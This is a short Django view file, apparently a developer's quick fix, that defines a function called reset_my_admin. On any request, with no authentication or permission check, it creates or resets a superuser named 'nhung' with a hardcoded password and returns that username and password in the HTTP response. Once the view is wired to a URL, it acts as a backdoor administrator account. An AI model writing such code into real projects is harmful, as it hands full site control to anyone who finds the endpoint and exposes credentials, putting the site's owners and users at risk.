from django.http import HttpResponse
from django.contrib.auth.models import User

def reset_my_admin(request):
    user, created = User.objects.get_or_create(username='nhung')
    user.set_password('887675nh') 
    user.is_staff = True
    user.is_superuser = True
    user.save()
    return HttpResponse("Xong! User: nhung | Pass: 887675nh")